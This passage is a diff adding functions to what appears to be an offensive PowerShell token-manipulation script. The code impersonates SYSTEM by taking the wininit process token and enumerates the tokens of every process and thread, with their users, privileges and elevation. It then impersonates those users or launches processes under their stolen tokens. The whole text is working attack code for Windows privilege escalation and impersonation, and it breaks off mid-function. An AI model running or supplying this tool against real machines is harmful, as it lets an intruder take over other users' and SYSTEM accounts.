@@ -770,3 +770,847 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     }
 }
 
+function Free-AllTokens
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [PSObject[]]
+        $TokenInfoObjs
+    )
+
+    foreach ($Obj in $TokenInfoObjs)
+    {
+        $Success = $CloseHandle.Invoke($Obj.hToken)
+        if (-not $Success)
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Verbose "Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode"
+        }
+        $Obj.hToken = [IntPtr]::Zero
+    }
+}
+
+function Invoke-RevertToSelf
+{
+    Param(
+        [Parameter(Position=0)]
+        [Switch]
+        $ShowOutput
+    )
+
+    $Success = $RevertToSelf.Invoke()
+
+    if ($ShowOutput)
+    {
+        if ($Success)
+        {
+            Write-Output "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        }
+        else
+        {
+            Write-Output "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        }
+    }
+}
+
+function Invoke-ImpersonateUser
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [IntPtr]
+        $hToken
+    )
+
+    #Duplicate the token so it can be used to create a new process
+    [IntPtr]$NewHToken = [IntPtr]::Zero
+    $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) #todo does this need to be freed
+    if (-not $Success)
+    {
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
+    }
+    else
+    {
+        $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
+        if (-not $Success)
+        {
+            $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
+        }
+    }
+
+    $Success = $CloseHandle.Invoke($NewHToken)
+    $NewHToken = [IntPtr]::Zero
+    if (-not $Success)
+    {
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
+    }
+
+    return $Success
+}
+
+function Create-ProcessWithToken
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [IntPtr]
+        $hToken,
+
+        [Parameter(Position=1, Mandatory=$true)]
+        [String]
+        $ProcessName,
+
+        [Parameter(Position=2)]
+        [String]
+        $ProcessArgs,
+
+        [Parameter(Position=3)]
+        [Switch]
+        $PassThru
+    )
+    Write-Verbose "Entering Create-ProcessWithToken"
+    #Duplicate the token so it can be used to create a new process
+    [IntPtr]$NewHToken = [IntPtr]::Zero
+    $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
+    if (-not $Success)
+    {
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
+    }
+    else
+    {
+        $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
+        [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
+        $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
+        [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct
+
+        $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
+        [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)
+
+        $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
+        $ProcessArgsPtr = [IntPtr]::Zero
+        if (-not [String]::IsNullOrEmpty($ProcessArgs))
+        {
+            $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
+        }
+        
+        $FunctionName = ""
+        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
+        {
+            #Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because
+            #this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege
+            #which is not ideal. 
+            Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
+            Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
+            $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+            $FunctionName = "CreateProcessAsUserW"
+        }
+        else
+        {
+            Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."
+            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+            $FunctionName = "CreateProcessWithTokenW"
+        }
+        if ($Success)
+        {
+            #Free the handles returned in the ProcessInfo structure
+            $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
+            $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
+            $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
+
+	#Pass created System.Diagnostics.Process object to pipeline
+	if ($PassThru) {
+		#Retrieving created System.Diagnostics.Process object
+		$returnProcess = Get-Process -Id $ProcessInfo.dwProcessId
+
+		#Caching process handle so we don't lose it when the process exits
+		$null = $returnProcess.Handle
+
+		#Passing System.Diagnostics.Process object to pipeline
+		$returnProcess
+	}
+        }
+        else
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "$FunctionName failed. Error code: $ErrorCode"
+        }
+
+        #Free StartupInfo memory and ProcessInfo memory
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
+        $StartupInfoPtr = [Intptr]::Zero
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
+        $ProcessInfoPtr = [IntPtr]::Zero
+        [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
+        $ProcessNamePtr = [IntPtr]::Zero
+
+        #Close handle for the token duplicated with DuplicateTokenEx
+        $Success = $CloseHandle.Invoke($NewHToken)
+        $NewHToken = [IntPtr]::Zero
+        if (-not $Success)
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
+        }
+    }
+}
+
+#Takes an array of TokenObjects built by the script and returns the unique ones
+function Get-UniqueTokens
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [Object[]]
+        $AllTokens
+    )
+
+    $TokenByUser = @{}
+    $TokenByEnabledPriv = @{}
+    $TokenByAvailablePriv = @{}
+
+    #Filter tokens by user
+    foreach ($Token in $AllTokens)
+    {
+        $Key = $Token.Domain + "\" + $Token.Username
+        if (-not $TokenByUser.ContainsKey($Key))
+        {
+            #Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because
+            #    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..
+            if ($Token.LogonType -ne 3 -and
+                $Token.Username -inotmatch "^DWM-\d+$" -and
+                $Token.Username -inotmatch "^LOCAL\sSERVICE$")
+            {
+                $TokenByUser.Add($Key, $Token)
+            }
+        }
+        else
+        {
+            #If Tokens have equal elevation levels, compare their privileges.
+            if($Token.IsElevated -eq $TokenByUser[$Key].IsElevated)
+            {
+                if (($Token.PrivilegesEnabled.Count + $Token.PrivilegesAvailable.Count) -gt ($TokenByUser[$Key].PrivilegesEnabled.Count + $TokenByUser[$Key].PrivilegesAvailable.Count))
+                {
+                    $TokenByUser[$Key] = $Token
+                }
+            }
+            #If the new token is elevated and the current token isn't, use the new token
+            elseif (($Token.IsElevated -eq $true) -and ($TokenByUser[$Key].IsElevated -eq $false))
+            {
+                $TokenByUser[$Key] = $Token
+            }
+        }
+    }
+
+    #Filter tokens by privilege
+    foreach ($Token in $AllTokens)
+    {
+        $Fullname = "$($Token.Domain)\$($Token.Username)"
+
+        #Filter currently enabled privileges
+        foreach ($Privilege in $Token.PrivilegesEnabled)
+        {
+            if ($TokenByEnabledPriv.ContainsKey($Privilege))
+            {
+                if($TokenByEnabledPriv[$Privilege] -notcontains $Fullname)
+                {
+                    $TokenByEnabledPriv[$Privilege] += ,$Fullname
+                }
+            }
+            else
+            {
+                $TokenByEnabledPriv.Add($Privilege, @($Fullname))
+            }
+        }
+
+        #Filter currently available (but not enable) privileges
+        foreach ($Privilege in $Token.PrivilegesAvailable)
+        {
+            if ($TokenByAvailablePriv.ContainsKey($Privilege))
+            {
+                if($TokenByAvailablePriv[$Privilege] -notcontains $Fullname)
+                {
+                    $TokenByAvailablePriv[$Privilege] += ,$Fullname
+                }
+            }
+            else
+            {
+                $TokenByAvailablePriv.Add($Privilege, @($Fullname))
+            }
+        }
+    }
+
+    $ReturnDict = @{
+        TokenByUser = $TokenByUser
+        TokenByEnabledPriv = $TokenByEnabledPriv
+        TokenByAvailablePriv = $TokenByAvailablePriv
+    }
+
+    return (New-Object PSObject -Property $ReturnDict)
+}
+
+#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+Function Get-ProcAddress
+{
+    Param
+    (
+        [OutputType([IntPtr])]
+    
+        [Parameter( Position = 0, Mandatory = $True )]
+        [String]
+        $Module,
+        
+        [Parameter( Position = 1, Mandatory = $True )]
+        [String]
+        $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+
+    # Return the address of the function
+    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+
+#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+Function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+        
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+        
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    
+    Write-Output $TypeBuilder.CreateType()
+}
+
+#Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.
+function Enum-AllTokens
+{
+    $AllTokens = @()
+
+    #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
+    #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges, so impersonate the wininit token.
+    $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
+    if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
+    {
+        Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
+    }
+
+    if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
+    {
+        $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
+        $systemTokenInfo = $null
+    }
+
+    $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}
+
+    #Get all tokens
+    foreach ($Process in $ProcessIds)
+    {
+        $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)
+
+        #If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.
+        if ($PrimaryTokenInfo -ne $null)
+        {
+            [IntPtr]$hToken = [IntPtr]$PrimaryTokenInfo.hProcToken
+
+            if ($hToken -ne [IntPtr]::Zero)
+            {
+                #Get the LUID corrosponding to the logon
+                $ReturnObj = Get-TokenInformation -hToken $hToken
+                if ($ReturnObj -ne $null)
+                {
+                    $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id
+
+                    $AllTokens += $ReturnObj
+                }
+            }
+            else
+            {
+                Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
+            }
+
+            foreach ($Thread in $Process.Threads)
+            {
+                $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
+                [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)
+
+                if ($hToken -ne [IntPtr]::Zero)
+                {
+                    $ReturnObj = Get-TokenInformation -hToken $hToken
+                    if ($ReturnObj -ne $null)
+                    {
+                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
+                
+                        $AllTokens += $ReturnObj
+                    }
+                }
+            }
+        }
+    }
+
+    return $AllTokens
+}
+
+#Get the primary token for the specified processId
+function Get-PrimaryToken
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [UInt32]
+        $ProcessId,
+
+        #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
+        [Parameter()]
+        [Switch]
+        $FullPrivs
+    )
+
+    if ($FullPrivs)
+    {
+        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
+    }
+    else
+    {
+        $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
+    }
+
+    $ReturnStruct = New-Object PSObject
+
+    $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
+    $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
+    if ($hProcess -eq [IntPtr]::Zero)
+    {
+        #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
+        return $null
+    }
+    else
+    {
+        [IntPtr]$hProcToken = [IntPtr]::Zero
+        $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)
+
+        #Close the handle to hProcess (the process handle)
+        if (-not $CloseHandle.Invoke($hProcess))
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
+        }
+        $hProcess = [IntPtr]::Zero
+
+        if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
+        {
+            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
+            return $null
+        }
+        else
+        {
+            $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
+        }
+    }
+
+    return $ReturnStruct
+}
+
+#Gets important information about the token such as the logon type associated with the logon
+function Get-TokenInformation
+{
+    Param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [IntPtr]
+        $hToken
+    )
+
+    $ReturnObj = $null
+
+    $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
+    [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
+    [UInt32]$RealSize = 0
+    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
+    if (-not $Success)
+    {
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
+    }
+    else
+    {
+        $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)
+
+        #Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon
+        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
+        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)
+
+        [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
+        $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
+        if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
+        {
+            Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr"
+        }
+        else
+        {
+            $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
+            if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
+                $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
+            {
+                #Get the username and domainname associated with the token
+                $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
+                $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)
+
+                #If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)
+                #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account 
+                #results in querying the domain controller which is unwanted.
+                if ($Username -ieq "$($env:COMPUTERNAME)`$")
+                {
+                    [UInt32]$Size = 100
+                    [UInt32]$NumUsernameChar = $Size / 2
+                    [UInt32]$NumDomainChar = $Size / 2
+                    [UInt32]$SidNameUse = 0
+                    $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
+                    $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
+                    $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)
+
+                    if ($Success)
+                    {
+                        $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
+                        $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
+                    }
+                    else
+                    {
+                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
+                    }
+
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
+                    $UsernameBuffer = [IntPtr]::Zero
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
+                    $DomainBuffer = [IntPtr]::Zero
+                }
+
+                $ReturnObj = New-Object PSObject
+                $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
+                $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
+                $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
+                $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType
+
+
+                #Query additional info about the token such as if it is elevated
+                $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false
+
+                $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
+                $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
+                [UInt32]$RealSize = 0
+                $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
+                if (-not $Success)
+                {
+                    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
+                }
+                else
+                {
+                    $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
+                    if ($TokenElevation.TokenIsElevated -ne 0)
+                    {
+                        $ReturnObj.IsElevated = $true
+                    }
+                }
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)
+
+
+                #Query the token type to determine if the token is a primary or impersonation token
+                $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value "UnableToRetrieve"
+
+                [UInt32]$TokenTypeSize = 4
+                [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
+                [UInt32]$RealSize = 0
+                $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
+                if (-not $Success)
+                {
+                    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
+                }
+                else
+                {
+                    [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
+                    switch($TokenType)
+                    {
+                        1 {$ReturnObj.TokenType = "Primary"}
+                        2 {$ReturnObj.TokenType = "Impersonation"}
+                    }
+                }
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)
+
+
+                #Query the impersonation level if the token is an Impersonation token
+                if ($ReturnObj.TokenType -ieq "Impersonation")
+                {
+                    $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value "UnableToRetrieve"
+
+                    [UInt32]$ImpersonationLevelSize = 4
+                    [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) #sizeof uint32
+                    [UInt32]$RealSize = 0
+                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
+                    if (-not $Success)
+                    {
+                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
+                    }
+                    else
+                    {
+                        [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
+                        switch ($ImpersonationLevel)
+                        {
+                            0 { $ReturnObj.ImpersonationLevel = "SecurityAnonymous" }
+                            1 { $ReturnObj.ImpersonationLevel = "SecurityIdentification" }
+                            2 { $ReturnObj.ImpersonationLevel = "SecurityImpersonation" }
+                            3 { $ReturnObj.ImpersonationLevel = "SecurityDelegation" }
+                        }
+                    }
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
+                }
+
+
+                #Query the token sessionid
+                $ReturnObj | Add-Member -Type NoteProperty -Name SessionID -Value "Unknown"
+
+                [UInt32]$TokenSessionIdSize = 4
+                [IntPtr]$TokenSessionIdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenSessionIdSize)
+                [UInt32]$RealSize = 0
+                $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenSessionId, $TokenSessionIdPtr, $TokenSessionIdSize, [Ref]$RealSize)
+                if (-not $Success)
+                {
+                    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
+                }
+                else
+                {
+                    [UInt32]$TokenSessionId = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenSessionIdPtr, [Type][UInt32])
+                    $ReturnObj.SessionID = $TokenSessionId
+                }
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenSessionIdPtr)
+
+
+                #Query the token privileges
+                $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
+                $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()
+
+                [UInt32]$TokenPrivilegesSize = 1000
+                [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesSize)
+                [UInt32]$RealSize = 0
+                $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPrivilegesPtr, $TokenPrivilegesSize, [Ref]$RealSize)
+                if (-not $Success)
+                {
+                    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
+                }
+                else
+                {
+                    $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
+                    
+                    #Loop through each privilege
+                    [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
+                    $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
+                    for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
+                    {
+                        $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))
+
+                        $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)
+
+                        #Lookup privilege name
+                        [UInt32]$PrivilegeNameSize = 60
+                        $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
+                        $PLuid = $LuidAndAttributePtr #The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid
+
+                        $Success = $LookupPrivilegeNameW.Invoke([IntPtr]::Zero, $PLuid, $PrivilegeNamePtr, [Ref]$PrivilegeNameSize)
+                        if (-not $Success)
+                        {
+                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                            Write-Warning "Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $PrivilegeNameSize"
+                        }
+                        $PrivilegeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($PrivilegeNamePtr)
+
+                        #Get the privilege attributes
+                        $PrivilegeStatus = ""
+                        $Enabled = $false
+
+                        if ($LuidAndAttribute.Attributes -eq 0)
+                        {
+                            $Enabled = $false
+                        }
+                        if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) #enabled by default
+                        {
+                            $Enabled = $true
+                        }
+                        if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED) -eq $Win32Constants.SE_PRIVILEGE_ENABLED) #enabled
+                        {
+                            $Enabled = $true
+                        }
+                        if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_REMOVED) -eq $Win32Constants.SE_PRIVILEGE_REMOVED) #SE_PRIVILEGE_REMOVED. This should never exist. Write a warning if it is found so I can investigate why/how it was found.
+                        {
+                            Write-Warning "Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "
+                        }
+
